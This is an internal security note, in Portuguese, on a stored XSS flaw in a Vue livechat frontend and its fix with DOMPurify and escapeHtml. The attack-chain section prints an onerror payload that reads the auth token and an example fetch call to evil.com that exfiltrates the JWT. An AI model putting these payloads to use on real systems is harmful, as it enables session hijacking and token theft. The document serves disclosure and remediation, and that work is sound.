---
title: Stored XSS no Livechat e InputTextTag — v-html e innerHTML sem sanitizacao
description: 21 componentes de chat + InputTextTag + HelpersComposable usavam v-html/innerHTML com conteudo externo sem sanitizacao. Attack chain confirmado. Fix com useSanitize + escapeHtml.
tags: [gotcha, security, xss, livechat, dompurify, chatfunnel-front]
severity: critica
related: ["[[livechat]]", "[[frontend-gotchas]]"]
last_updated: 2026-05-12
---

# Stored XSS no Livechat — v-html sem DOMPurify

## O que acontece

Componentes de chat (balloons) renderizavam mensagens com `v-html` sem sanitizacao. Um atacante podia injetar HTML/JS que executava no browser de qualquer operador que abrisse a conversa.

**Attack chain confirmado em 2026-05-11:**
1. Operador cria nota interna com `<img src=x onerror="document.title='VULN-TOKEN:'+localStorage.getItem('auth')">`
2. Outro operador abre a conversa → JS executa → titulo da aba muda com trecho do JWT
3. Em ataque real: `fetch('https://evil.com?t='+localStorage.getItem('auth'))` exfiltra JWT (30d) + Facebook token (60d)

**Vetor principal:** notas internas (StickNote) — escritas por operador, sem sanitizacao do WhatsApp no transporte. Mensagens do WhatsApp chegam como texto puro (API sanitiza), mas o risco existe via Instagram DMs, templates com variaveis, e manipulacao direta da API/banco.

## Componentes afetados (antes do fix)

| Area | Componentes | Tipo de v-html |
|------|-------------|---------------|
| WhatsApp ContactBubble | TextBallon, Answer (3x), TemplateBallon, MediaBallon | md.renderInline, formatText, .replace |
| WhatsApp SentBubble | TextBallon, StickNote, TemplateBallon, TemplateV2Ballon, InteractiveBallon, MediaBallon | md.renderInline, raw objMessage, formatText, .replace |
| Instagram ContactBubble | TextBallon, TemplateBallon | .replace |
| Instagram SentBubble | TextBallon, TemplateBallon (2x), IgReelsBallon | .replace, raw payload.text |

**Seguros (sem fix necessario):**
- ContactBubble/InteractiveBallon — usa `{{ }}` (interpolacao Vue, auto-escape)
- ContactBubble/instagram/IgReelsBallon — `v-html` ja estava comentado

## Causa raiz

- DOMPurify estava instalado (`^3.3.1`) mas usado em apenas **1 de 46** componentes com `v-html` (`IntelligenceChatBubble.vue`)
- A funcao `formatText()` (Answer.vue, SentBubble/TemplateBallon.vue) usa `container.innerHTML = text` para resolver variaveis de contato — injeta HTML diretamente no DOM
- `InputTextTag` (legacy e shadcn) usa `contenteditable` + `innerHTML` sem escape em: `handlePaste`, `insertText`, `setText`
- `convertTextWithVariables()` (HelpersComposable.js e HelpersComposableShadcn.ts) recebia texto do banco com `plaintext::` prefix, removia o prefix e injetava via `innerHTML` sem escapar HTML — qualquer tag salva no banco executava ao carregar

## Fix aplicado (2026-05-12)

### Composable centralizado

```
src/common/composables/useSanitize.ts
```

Exporta:
- `sanitizeHtml(html)` — DOMPurify com allowlist: `p, strong, em, del, br, a, code, pre, ul, ol, li, blockquote, span`. Attrs: `href, target, rel, class, contenteditable, style`. Event handlers (`onerror`, `onload`, etc) sao sempre stripados pelo DOMPurify.
- `sanitizeMarkdown(text)` — markdown-it renderInline + DOMPurify (mesma allowlist)

> **IMPORTANTE:** `span` e `class` sao necessarios na allowlist para que chips de variaveis de contato (`<span class="contactData">`) sobrevivam a sanitizacao. Sem `span`, `formatText()` → `sanitizeHtml()` remove os chips e templates quebram.

### Padrao de aplicacao

```vue
<!-- ANTES (vulneravel) -->
<div v-html="message?.objMessage?.replaceAll('\n', '<br>')"></div>

<!-- DEPOIS (seguro) -->
<div v-html="contentSanitized"></div>

<script setup>
import { computed } from 'vue'
import { useSanitize } from '@/common/composables/useSanitize'

const { sanitizeHtml } = useSanitize()
const contentSanitized = computed(() => {
  return sanitizeHtml(props.message?.objMessage?.replaceAll('\n', '<br>'))
})
</script>
```

Para `formatText()`: wrap da **saida** (nao reescrita da funcao):
```javascript
const bodyFormatted = computed(() => sanitizeHtml(formatText(template.value.bodyText, contact.value)))
```

### Arquivos modificados

- 1 criado: `src/common/composables/useSanitize.ts`
- 15 modificados (todos em `src/views/livechat/components/ChatMessages/components/`)
- Branch: `security/document-11-05-2026` (chatfunnel-front)

### Fix InputTextTag + HelpersComposable (2026-05-12)

**Problema:** `InputTextTag` (legacy e shadcn) executa XSS ao salvar e recarregar conteudo com tags HTML. O `convertTextWithVariables()` recebia `plaintext::<img src=x onerror=alert(1)>` do banco, removia `plaintext::` e injetava via `innerHTML` sem escape.

**Arquivos corrigidos:**

| Arquivo | Fix |
|---------|-----|
| `src/common/composables/HelpersComposable.js` | `escapeHtml()` no texto antes de converter `{{var:label}}` em chips |
| `src/common/composables/HelpersComposableShadcn.ts` | Idem (versao shadcn) |
| `src/components/inputs/InputTextTag.vue` (legacy) | `escapeHtml` em `handlePaste`, `createTextNode` em `insertText`, escape em `insertHtmlAtCursor` |
| `src/components/shadcn-custom/input-text-tag/useEditableCursor.ts` | Idem (versao shadcn) |

**Padrao `escapeHtml`:**
```javascript
const escapeHtml = (text) => {
  const div = document.createElement("div");
  div.appendChild(document.createTextNode(text));
  return div.innerHTML;
};
```

**Fluxo corrigido do `convertTextWithVariables`:**
1. Remove `plaintext::`
2. **`escapeHtml()`** — converte `<img>` em `&lt;img&gt;`
3. Converte `\n` → `<br/>`
4. Converte `{{var:label}}` → chip HTML (controlado)
5. `innerHTML` recebe HTML seguro

### Fix MenuVariables z-index + toolbar auto-hide (2026-05-12)

**Problema:** O popup do `MenuVariables` abria por baixo do `v-dialog` (z-index 99999 em `DefaultDialog.vue`). Alem disso, o `@mouseleave="hideTools"` no `InputTextTag` fechava o toolbar enquanto o menu ainda estava aberto (popup renderiza fora da arvore DOM do componente).

**Arquivos corrigidos:**

| Arquivo | Fix |
|---------|-----|
| `src/components/buttons/MenuVariables.vue` | Wrapper `<div ref="menuRoot" style="display: contents">`, `v-model` no v-menu, `:attach="attachTarget"` (closest `.v-overlay__content`), emit `menu:toggle` |
| `src/components/inputs/InputTextTag.vue` | Ref `menuOpen`, `hideTools()` retorna early se `menuOpen === true`, escuta `@menu:toggle` |

**Fluxo corrigido:**
1. Menu abre → `menu:toggle(true)` → `menuOpen = true`
2. Mouse sai do botao pro popup → `@mouseleave` → `hideTools()` → **bloqueado** por `menuOpen`
3. Usuario seleciona campo → menu fecha → `menu:toggle(false)` → `menuOpen = false`
4. Mouse sai da area → `hideTools()` → timer 1s → toolbar some

### Riscos conhecidos

| Risco | Severidade | Detalhe |
|-------|-----------|---------|
| `convertTextWithVariables` path contactData | Media | HTML fora do regex de contactData passa sem escape. Afeta dados antigos no banco sem `plaintext::` que contenham spans + HTML arbitrario |
| `.replace('\n')` sem flag global | Baixa | Alguns balloons Instagram usam `.replace('\n', '<br>')` que so substitui primeira ocorrencia. Funcional mas inconsistente |
| `display: contents` no wrapper | Baixa | `closest()` funciona, mas navegadores antigos (IE11) nao suportam `display: contents` |

## Regras para novos componentes

> **NUNCA** use `v-html` com dados externos sem `useSanitize`. Se precisar renderizar HTML de mensagens, templates ou conteudo de usuario, **sempre** passe por `sanitizeHtml()` ou `sanitizeMarkdown()`.

> **NUNCA** use `innerHTML` com texto de usuario ou do banco sem `escapeHtml()`. Para texto puro (emojis, input do usuario), usar `document.createTextNode()` em vez de `innerHTML`.

## Relacionado

- [[livechat]] — feature principal afetada
- [[frontend-gotchas]] — outros gotchas do frontend
- `docs/security/2026-05-11-chatfunnel-front-security-audit.md` — audit completo (61 findings)
- `docs/security/2026-05-11-pentest-exploitation-guide.md` — guia de pentest
- `docs/superpowers/plans/2026-05-12-xss-dompurify-livechat.md` — plano de execucao
